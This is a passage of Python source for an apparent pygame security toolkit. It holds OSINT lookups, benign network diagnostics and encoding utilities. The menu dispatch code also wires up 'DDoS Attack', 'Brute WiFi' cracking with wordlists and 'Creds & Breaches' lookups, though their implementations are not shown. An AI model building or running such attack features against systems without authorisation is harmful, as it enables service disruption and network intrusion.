    except Exception as e:
        results.append(f"# error: {e}")

def tool_abuseipdb(target, results):
    results.append(f"[+] AbuseIPDB: {target}")
    key = API.get("abuseipdb", "")
    if not key:
        results.append("# API key empty — fill abuseipdb"); return
    import urllib.request, json as _j
    url = f"https://api.abuseipdb.com/api/v2/check?ipAddress={target}&maxAgeInDays=90"
    req = urllib.request.Request(url, headers={"Key": key, "Accept": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=8) as r:
            data = _j.loads(r.read()).get("data", {})
            for k in ["ipAddress", "isPublic", "ipVersion", "isWhitelisted", "abuseConfidenceScore",
                      "countryCode", "usageType", "isp", "domain", "totalReports"]:
                if k in data:
                    results.append(f"  {k}: {data[k]}")
    except Exception as e:
        results.append(f"# error: {e}")

def tool_urlscan(target, results):
    results.append(f"[+] URLScan: {target}")
    key = API.get("urlscan", "")
    import urllib.request, json as _j
    payload = {"url": target, "visibility": "public"}
    headers = {"Content-Type": "application/json"}
    if key: headers["API-Key"] = key
    req = urllib.request.Request("https://urlscan.io/api/v1/scan/",
                                data=json.dumps(payload).encode(), headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            data = _j.loads(r.read())
            results.append(f"[+] scan submitted: {data.get('message')}")
            results.append(f"  uuid: {data.get('uuid')}")
            results.append(f"  result: {data.get('result')}")
    except Exception as e:
        results.append(f"# error: {e}")

def tool_numverify(target, results):
    results.append(f"[+] NumVerify: {target}")
    key = API.get("numverify", "")
    if not key:
        results.append("# API key empty — fill numverify"); return
    import urllib.request, json as _j
    url = f"https://apilayer.net/api/validate?access_key={urllib.parse.quote(key)}&number={urllib.parse.quote(target)}"
    try:
        with urllib.request.urlopen(url, timeout=8) as r:
            data = _j.loads(r.read())
            for k in ["valid", "number", "local_format", "international_format", "country_prefix",
                      "country_code", "country_name", "location", "carrier", "line_type"]:
                if k in data:
                    results.append(f"  {k}: {data[k]}")
    except Exception as e:
        results.append(f"# error: {e}")

def tool_local_network_info(results):
    """Show information about this machine's network interfaces and addresses."""
    import platform
    results.append("[+] Local network information")
    results.append(f"# hostname: {socket.gethostname()}")
    results.append(f"# platform: {platform.system()} {platform.release()}")
    seen = set()
    try:
        for item in socket.getaddrinfo(socket.gethostname(), None, type=socket.SOCK_STREAM):
            address = item[4][0]
            if address not in seen:
                seen.add(address)
                results.append(f"  address: {address}")
    except OSError as exc:
        results.append(f"# address lookup: {exc}")
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as probe:
            probe.connect(("192.0.2.1", 80))
            results.append(f"  outbound IPv4: {probe.getsockname()[0]}")
    except OSError as exc:
        results.append(f"# outbound IPv4 unavailable: {exc}")
    if not seen:
        results.append("# no interface addresses returned by hostname lookup")


def tool_tcp_latency(target, results):
    """Measure one TCP connection handshake; no payload is sent."""
    raw = target.strip()
    host, port_text = (raw.rsplit(":", 1) if ":" in raw else (raw, "443"))
    try:
        port = int(port_text)
        if not 1 <= port <= 65535:
            raise ValueError("port must be between 1 and 65535")
    except ValueError as exc:
        results.append(f"# invalid port: {exc}")
        return
    results.append(f"[+] TCP latency probe: {host}:{port}")
    started = time.perf_counter()
    try:
        with socket.create_connection((host, port), timeout=4):
            elapsed = (time.perf_counter() - started) * 1000
        results.append(f"[+] TCP handshake: {elapsed:.1f} ms")
    except OSError as exc:
        results.append(f"# connection failed: {exc}")


def _normalize_domain(value):
    from urllib.parse import urlparse
    candidate = value.strip()
    if "://" in candidate:
        candidate = urlparse(candidate).hostname or ""
    candidate = candidate.rstrip(".").lower()
    if not candidate or any(ch.isspace() for ch in candidate):
        raise ValueError("enter a valid domain name")
    return candidate


def tool_http_security_headers(target, results):
    from urllib.parse import urlparse
    url = target.strip()
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    parsed = urlparse(url)
    if parsed.scheme not in ("http", "https") or not parsed.hostname:
        results.append("# invalid URL")
        return
    req = urllib.request.Request(url, headers={"User-Agent": "CORE-TOOL/1.0 (security header audit)"}, method="GET")
    results.append(f"[+] HTTP security header audit: {parsed.hostname}")
    try:
        with urllib.request.urlopen(req, timeout=8) as response:
            headers = response.headers
            results.append(f"# HTTP status: {response.status}")
            checks = {
                "Strict-Transport-Security": "HSTS",
                "Content-Security-Policy": "CSP",
                "X-Content-Type-Options": "MIME sniffing protection",
                "X-Frame-Options": "Clickjacking protection",
                "Referrer-Policy": "Referrer policy",
                "Permissions-Policy": "Permissions policy",
            }
            for header, label in checks.items():
                value = headers.get(header)
                results.append(("[+] " if value else "[!] ") + f"{label}: {value if value else 'not present'}")
            server = headers.get("Server")
            if server:
                results.append(f"# Server banner: {server}")
    except Exception as exc:
        results.append(f"# HTTP request failed: {exc}")


def tool_rdap_domain(target, results):
    domain = _normalize_domain(target)
    results.append(f"[+] RDAP domain lookup: {domain}")
    req = urllib.request.Request(f"https://rdap.org/domain/{urllib.parse.quote(domain)}",
                                 headers={"Accept": "application/rdap+json", "User-Agent": "CORE-TOOL/1.0"})
    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            data = json.loads(response.read(1_000_000).decode("utf-8", errors="replace"))
        results.append(f"# handle: {data.get('handle', 'n/a')}")
        for event in data.get("events", []):
            action = event.get("eventAction", "event")
            date = event.get("eventDate", "")
            results.append(f"  {action}: {date}")
        nameservers = [ns.get("ldhName") for ns in data.get("nameservers", []) if ns.get("ldhName")]
        for ns in nameservers[:12]:
            results.append(f"  nameserver: {ns}")
        statuses = data.get("status", [])
        if statuses:
            results.append("# status: " + ", ".join(statuses[:12]))
        if not data:
            results.append("# RDAP returned an empty response")
    except Exception as exc:
        results.append(f"# RDAP lookup failed: {exc}")


def tool_spf_dmarc_audit(target, results):
    domain = _normalize_domain(target)
    results.append(f"[+] SPF / DMARC audit: {domain}")
    try:
        import dns.resolver
    except ImportError:
        results.append("# dnspython not installed — install requirements.txt")
        return
    for name, label in ((domain, "SPF"), (f"_dmarc.{domain}", "DMARC")):
        try:
            answers = dns.resolver.resolve(name, "TXT", lifetime=4)
            records = [b"".join(part for part in r.strings).decode("utf-8", errors="replace") for r in answers]
            matching = [r for r in records if ("v=spf1" in r.lower() if label == "SPF" else "v=dmarc1" in r.lower())]
            if matching:
                for record in matching:
                    results.append(f"[+] {label}: {record[:240]}")
            else:
                results.append(f"[!] {label}: TXT records found, but no {label} policy detected")
        except Exception as exc:
            results.append(f"[!] {label}: no record or lookup error ({type(exc).__name__})")


def tool_traceroute(target, results):
    """Run a bounded, read-only route trace to a host."""
    import platform
    host = target.strip()
    if not host or any(c.isspace() for c in host):
        results.append("# enter a valid host or IP")
        return
    system = platform.system().lower()
    if system == "windows":
        cmd = ["tracert", "-d", "-h", "12", "-w", "1000", host]
    elif shutil.which("traceroute"):
        cmd = ["traceroute", "-m", "12", "-w", "1", host]
    elif shutil.which("tracepath"):
        cmd = ["tracepath", "-m", "12", host]
    else:
        results.append("# traceroute/tracepath command not installed")
        return
    results.append(f"[+] Traceroute to {host}")
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
        for line in (proc.stdout or proc.stderr).splitlines()[:18]:
            results.append(line[:110])
        results.append(f"# exit code: {proc.returncode}")
    except subprocess.TimeoutExpired:
        results.append("# traceroute timed out")
    except OSError as exc:
        results.append(f"# traceroute error: {exc}")


def tool_gateway_discovery(results):
    """Display the configured default gateway without scanning the LAN."""
    import platform
    system = platform.system().lower()
    results.append("[+] Default gateway discovery")
    try:
        if system == "windows":
            out = subprocess.run(["ipconfig"], capture_output=True, text=True, timeout=5, check=False)
            lines = [line.strip() for line in out.stdout.splitlines()
                     if "Default Gateway" in line or "Gateway predefinito" in line]
            results.extend(lines or ["# gateway not found in ipconfig output"])
        elif system == "darwin":
            out = subprocess.run(["route", "-n", "get", "default"], capture_output=True,
                                 text=True, timeout=5, check=True)
            lines = [line.strip() for line in out.stdout.splitlines() if "gateway:" in line]
            results.extend(lines or ["# gateway not found"])
        else:
            found = []
            with open("/proc/net/route", encoding="utf-8") as route_file:
                next(route_file, None)
                for line in route_file:
                    fields = line.split()
                    if len(fields) > 2 and fields[1] == "00000000":
                        gateway = socket.inet_ntoa(bytes.fromhex(fields[2])[::-1])
                        found.append(f"[+] interface {fields[0]} — gateway {gateway}")
            results.extend(found or ["# default gateway not found"])
    except Exception as exc:
        results.append(f"# gateway lookup error: {exc}")


def tool_dnssec_check(target, results):
    """Inspect DNSSEC records using dnspython; this is not full validation."""
    try:
        import dns.resolver
    except ImportError:
        results.append("# dnspython not installed — pip install dnspython")
        return
    domain = _normalize_domain(target)
    results.append(f"[+] DNSSEC records for {domain}")
    for record_type in ("DNSKEY", "DS"):
        try:
            answers = dns.resolver.resolve(domain, record_type, lifetime=5)
            records = list(answers)
            results.append(f"[+] {record_type}: {len(records)} record(s)")
            for record in records[:8]:
                results.append("  " + str(record)[:105])
        except Exception as exc:
            results.append(f"[!] {record_type}: unavailable ({type(exc).__name__})")
    results.append("# Record presence is not, by itself, proof of successful DNSSEC validation.")


def tool_tls_certificate_inspector(target, results):
    """Inspect the TLS certificate presented by a host."""
    raw = target.strip()
    host, port_text = (raw.rsplit(":", 1) if ":" in raw else (raw, "443"))
    try:
        port = int(port_text)
        if not 1 <= port <= 65535:
            raise ValueError("port out of range")
    except ValueError as exc:
        results.append(f"# invalid port: {exc}")
        return
    results.append(f"[+] TLS certificate: {host}:{port}")
    try:
        context = ssl.create_default_context()
        with socket.create_connection((host, port), timeout=5) as sock:
            with context.wrap_socket(sock, server_hostname=host) as tls:
                cert = tls.getpeercert()
                results.append(f"# TLS version: {tls.version()}")
                results.append(f"# cipher: {tls.cipher()}")
                results.append(f"# subject: {cert.get('subject')}")
                results.append(f"# issuer: {cert.get('issuer')}")
                results.append(f"# valid from: {cert.get('notBefore')}")
                results.append(f"# valid until: {cert.get('notAfter')}")
                for kind, value in cert.get("subjectAltName", ())[:10]:
                    results.append(f"  SAN {kind}: {value}")
    except Exception as exc:
        results.append(f"# TLS inspection failed: {exc}")


def make_runner(tool_name):
    def runner(results):
        if tool_name == "Network Scan":
            state["input_prompt"] = "Target subnet/IP (e.g. 192.168.1.0/24):"
            state["input_active"] = True
            state["_pending"] = ("network_scan", results); return
        if tool_name == "Device Discovery":
            tool_device_discovery(results); return
        if tool_name == "Traffic Analysis":
            tool_traffic_analysis(results); return
        if tool_name == "Stress Testing":
            state["input_prompt"] = "Target URL/host:"
            state["input_active"] = True
            state["_pending"] = ("stress", results); return
        if tool_name == "Netcat / Socat":
            state["input_prompt"] = "host:port (e.g. example.com:80):"
            state["input_active"] = True
            state["_pending"] = ("netcat", results); return
        if tool_name == "Brute WiFi":
            # multi-field input
            state["multi_input"] = True
            state["input_fields"] = [
                ("SSID:", ""),
                ("Capture file (.cap/.hccapx) path:", ""),
                ("Wordlist path:", WIFI_WORDLIST),
            ]
            state["input_field_idx"] = 0
            state["_pending"] = ("brute_wifi", results); return
        if tool_name == "Vuln Scanners":
            state["multi_input"] = True
            state["input_fields"] = [
                ("Target host/IP:", ""),
                ("Mode (1 = INSERT MANUAL PORTS, 2 = SCAN RANGE):", "2"),
                ("Ports Input (e.g. 80,443 for Mode 1 OR 1000 for Mode 2 Range):", "1000")
            ]
            state["input_field_idx"] = 0
            state["_pending"] = ("vuln", results); return
        if tool_name == "Local Network Info":
            tool_local_network_info(results); return
        if tool_name == "TCP Latency Probe":
            state["input_prompt"] = "Host or host:port (default port 443):"
            state["input_active"] = True
            state["_pending"] = ("tcp_latency", results); return
        if tool_name == "Traceroute":
            state["input_prompt"] = "Host or domain:"
            state["input_active"] = True
            state["_pending"] = ("traceroute", results); return
        if tool_name == "Gateway Discovery":
            tool_gateway_discovery(results); return
        if tool_name == "DNSSEC Check":
            state["input_prompt"] = "Domain (e.g. example.com):"
            state["input_active"] = True
            state["_pending"] = ("dnssec", results); return
        if tool_name == "TLS Certificate Inspector":
            state["input_prompt"] = "Host or host:port:"
            state["input_active"] = True
            state["_pending"] = ("tls_inspector", results); return
        if tool_name == "DDoS Attack":
            state["multi_input"] = True
            state["input_fields"] = [
                ("Target URL/IP:", ""),
                ("Su quale porta operare (es. 80, 443, 8080):", "")
            ]
            state["input_field_idx"] = 0
            state["_pending"] = ("ddos", results); return

        if tool_name == "Domain / DNS / Web Infra":
            state["input_prompt"] = "Domain (e.g. example.com):"
            state["input_active"] = True
            state["_pending"] = ("domain", results); return
        if tool_name == "People / Username / Social":
            state["input_prompt"] = "Username:"
            state["input_active"] = True
            state["_pending"] = ("people", results); return
        if tool_name == "Creds & Breaches":
            state["input_prompt"] = "Email:"
            state["input_active"] = True
            state["_pending"] = ("creds", results); return
        if tool_name == "VirusTotal":
            state["input_prompt"] = "URL / IP / domain / hash:"
            state["input_active"] = True
            state["_pending"] = ("virustotal", results); return
        if tool_name == "Abstract Email":
            state["input_prompt"] = "Email:"
            state["input_active"] = True
            state["_pending"] = ("abstract", results); return
        if tool_name == "AbuseIPDB":
            state["input_prompt"] = "IP address:"
            state["input_active"] = True
            state["_pending"] = ("abuseipdb", results); return
        if tool_name == "URLScan":
            state["input_prompt"] = "URL:"
            state["input_active"] = True
            state["_pending"] = ("urlscan", results); return
        if tool_name == "HTTP Security Headers":
            state["input_prompt"] = "Website URL or domain:"
            state["input_active"] = True
            state["_pending"] = ("http_headers", results); return
        if tool_name == "RDAP Domain Lookup":
            state["input_prompt"] = "Domain (e.g. example.com):"
            state["input_active"] = True
            state["_pending"] = ("rdap", results); return
        if tool_name == "SPF / DMARC Audit":
            state["input_prompt"] = "Domain (e.g. example.com):"
            state["input_active"] = True
            state["_pending"] = ("spf_dmarc", results); return
        if tool_name == "NumVerify":
            state["input_prompt"] = "Phone number:"
            state["input_active"] = True
            state["_pending"] = ("numverify", results); return
        results.append(f"# unknown tool: {tool_name}")
    return runner

def dispatch_pending(kind, value, results):
    if kind == "network_scan":
        tool_network_scan(value, results)
    elif kind == "stress":
        tool_stress_testing(value, results)
    elif kind == "netcat":
        tool_netcat_socat(value, results)
    elif kind == "brute_wifi":
        # value is (ssid, capture)
        ssid, capture, wordlist = value
        tool_brute_wifi(ssid, capture, wordlist, results)
    elif kind == "vuln":
        tool_vuln_scanners(value, results)
    elif kind == "ddos":
        tool_ddos(value, results)
    elif kind == "tcp_latency":
        tool_tcp_latency(value, results)
    elif kind == "traceroute":
        tool_traceroute(value, results)
    elif kind == "dnssec":
        tool_dnssec_check(value, results)
    elif kind == "tls_inspector":
        tool_tls_certificate_inspector(value, results)
    elif kind == "http_headers":
        tool_http_security_headers(value, results)
    elif kind == "rdap":
        tool_rdap_domain(value, results)
    elif kind == "spf_dmarc":
        tool_spf_dmarc_audit(value, results)
    elif kind == "domain":
        tool_domain_dns(value, results)
    elif kind == "people":
        tool_people_username(value, results)
    elif kind == "creds":
        tool_creds_breaches(value, results)
    elif kind == "virustotal":
        tool_virustotal(value, results)
    elif kind == "abstract":
        tool_abstract_email(value, results)
    elif kind == "abuseipdb":
        tool_abuseipdb(value, results)
    elif kind == "urlscan":
        tool_urlscan(value, results)
    elif kind == "numverify":
        tool_numverify(value, results)

def start_tool(tool_name):
    state["tool"] = tool_name
    state["tool_start"] = pygame.time.get_ticks()
    state["tool_done"] = False
    state["tool_results"] = []
    state["tool_status"] = ""
    state["scroll"] = 0
    state["input_active"] = False
    state["input_value"] = ""
    state["multi_input"] = False
    state["input_fields"] = []
    state["input_field_idx"] = 0
    state["_pending"] = None
    runner = make_runner(tool_name)
    def worker():
        try:
            runner(state["tool_results"])
        except Exception as e:
            state["tool_results"].append(f"# error: {e}")
        if not state["input_active"] and not state["multi_input"]:
            state["tool_done"] = True
    t = threading.Thread(target=worker, daemon=True)
    state["running_thread"] = t
    t.start()

def run_util(name, inp):
    try:
        if name == "Base64 Encode": return base64.b64encode(inp.encode()).decode()
        if name == "Base64 Decode": return base64.b64decode(inp.encode(), validate=True).decode(errors="replace")
        if name == "Base32 Encode": return base64.b32encode(inp.encode()).decode()
        if name == "Base32 Decode": return base64.b32decode(inp.encode()).decode(errors="replace")
        if name == "Hex Encode": return inp.encode().hex()
        if name == "Hex Decode": return bytes.fromhex(inp.strip()).decode(errors="replace")
        if name == "URL Encode": return urllib.parse.quote(inp)
        if name == "URL Decode": return urllib.parse.unquote(inp)
        if name == "MD5 Hash": return hashlib.md5(inp.encode()).hexdigest()
        if name == "SHA256 Hash": return hashlib.sha256(inp.encode()).hexdigest()
        if name == "ROT13":
            import codecs; return codecs.encode(inp, "rot13")
        if name == "Reverse String": return inp[::-1]
        if name == "Password Strength":
            score = 0
            if len(inp) >= 8: score += 1
            if len(inp) >= 12: score += 1
            if any(c.isdigit() for c in inp): score += 1
            if any(c.isupper() for c in inp): score += 1
            if any(c.islower() for c in inp): score += 1
            if any(not c.isalnum() for c in inp): score += 1
            labels = ["very weak", "weak", "fair", "good", "strong", "very strong"]
            return f"score {score}/6 — {labels[min(score, 5)]}"
        if name == "Char / Word Count":
            return f"chars={len(inp)}  words={len(inp.split())}  lines={inp.count(chr(10)) + (1 if inp else 0)}"
    except Exception as e:
        return f"error: {e}"
    return ""

def main():
    pygame.init()
    screen = pygame.display.set_mode((WIDTH, HEIGHT))
    pygame.display.set_caption("VEXTH TOOL")
    clock = pygame.time.Clock()
    fonts = (pygame.font.SysFont("couriernew", 16, bold=True),
             pygame.font.SysFont("couriernew", 22, bold=True),
             pygame.font.SysFont("couriernew", 13))

    boot_intro(screen, clock)

    running = True
    while running:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                running = False
            elif event.type == pygame.KEYDOWN:
                if state["mode"] == "hud":
                    if event.key in (pygame.K_ESCAPE, pygame.K_q):
                        running = False
                    elif event.key == pygame.K_TAB:
                        state["panel"] = (state["panel"] + 1) % 3
                        state["sel"] = 0
                    elif event.key == pygame.K_UP:
                        if state["panel"] in (0, 1):
                            cur_list = NETWORK_TOOLS if state["panel"] == 0 else OSINT_TOOLS
                            state["sel"] = max(0, state["sel"] - 1)
                    elif event.key == pygame.K_DOWN:
                        if state["panel"] in (0, 1):
                            cur_list = NETWORK_TOOLS if state["panel"] == 0 else OSINT_TOOLS
                            state["sel"] = min(len(cur_list) - 1, state["sel"] + 1)
                    elif event.key in (pygame.K_RETURN, pygame.K_KP_ENTER):
                        if state["panel"] == 2:
                            state["mode"] = "utils_menu"
                        else:
                            cur_list = NETWORK_TOOLS if state["panel"] == 0 else OSINT_TOOLS
                            start_tool(cur_list[state["sel"]][0])
                            state["mode"] = "tool"
                elif state["mode"] == "tool":
                    if state["multi_input"]:
                        if event.key == pygame.K_ESCAPE:
                            state["multi_input"] = False
                            state["mode"] = "hud"
                        elif event.key == pygame.K_TAB:
                            state["input_field_idx"] = (state["input_field_idx"] + 1) % len(state["input_fields"])
                        elif event.key == pygame.K_RETURN:
                            # if last field, run
                            if state["input_field_idx"] == len(state["input_fields"]) - 1:
                                vals = [v for _, v in state["input_fields"]]
                                state["multi_input"] = False
                                state["tool_results"].append(f"# inputs: {vals}")
                                pending = state["_pending"]
                                def worker():
                                    try:
                                        dispatch_pending(pending[0], tuple(vals), state["tool_results"])
                                    except Exception as e:
                                        state["tool_results"].append(f"# error: {e}")
                                    state["tool_done"] = True
                                threading.Thread(target=worker, daemon=True).start()
                            else:
                                state["input_field_idx"] += 1
                        elif event.key == pygame.K_BACKSPACE:
                            i = state["input_field_idx"]
                            state["input_fields"][i] = (state["input_fields"][i][0], state["input_fields"][i][1][:-1])
                        elif event.unicode and event.unicode.isprintable():
                            i = state["input_field_idx"]
                            state["input_fields"][i] = (state["input_fields"][i][0], state["input_fields"][i][1] + event.unicode)
                    elif state["input_active"]:
                        if event.key == pygame.K_ESCAPE:
                            state["input_active"] = False
                            state["mode"] = "hud"
                        elif event.key == pygame.K_RETURN:
                            val = state["input_value"].strip()
                            state["input_active"] = False
                            state["tool_results"].append(f"# input: {val}")
                            pending = state["_pending"]
                            def worker():
                                try:
                                    dispatch_pending(pending[0], val, state["tool_results"])
                                except Exception as e:
                                    state["tool_results"].append(f"# error: {e}")
                                state["tool_done"] = True
                            threading.Thread(target=worker, daemon=True).start()
                        elif event.key == pygame.K_BACKSPACE:
                            state["input_value"] = state["input_value"][:-1]
                        elif event.unicode and event.unicode.isprintable():
                            state["input_value"] += event.unicode
                    else:
                        if event.key in (pygame.K_ESCAPE, pygame.K_q):
                            state["mode"] = "hud"
                        elif event.key == pygame.K_UP:
                            state["scroll"] = max(0, state["scroll"] - 1)
                        elif event.key == pygame.K_DOWN:
                            state["scroll"] = min(max(0, len(state["tool_results"]) - 26), state["scroll"] + 1)
                elif state["mode"] == "utils_menu":
                    if event.key in (pygame.K_ESCAPE, pygame.K_q):
                        state["mode"] = "hud"
                    elif event.key == pygame.K_UP:
                        state["util_sel"] = max(0, state["util_sel"] - 1)
                    elif event.key == pygame.K_DOWN:
                        state["util_sel"] = min(len(UTILITIES) - 1, state["util_sel"] + 1)
                    elif event.key in (pygame.K_RETURN, pygame.K_KP_ENTER):
                        state["util_input"] = ""
                        state["util_output"] = ""
                        state["util_ran"] = False
                        state["mode"] = "util_run"
                elif state["mode"] == "util_run":
                    if event.key in (pygame.K_ESCAPE, pygame.K_q):
                        state["mode"] = "utils_menu"
                    elif event.key == pygame.K_RETURN:
                        state["util_output"] = run_util(UTILITIES[state["util_sel"]][0], state["util_input"])
                        state["util_ran"] = True
                    elif event.key == pygame.K_BACKSPACE:
                        state["util_input"] = state["util_input"][:-1]
                    elif event.unicode and event.unicode.isprintable():
                        state["util_input"] += event.unicode

        if state["mode"] == "tool" and not state["input_active"] and not state["multi_input"]:
            if state["running_thread"] and not state["running_thread"].is_alive() and not state["tool_done"] and state["_pending"] is None:
                state["tool_done"] = True

        if state["mode"] == "hud":
            draw_hud(screen, fonts)
        elif state["mode"] == "tool":
            draw_tool(screen, fonts, state["tool"])
        elif state["mode"] == "utils_menu":
            draw_utils_menu(screen, fonts)
        elif state["mode"] == "util_run":
            draw_util_run(screen, fonts)

        pygame.display.flip()
        clock.tick(FPS)

    pygame.quit()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass

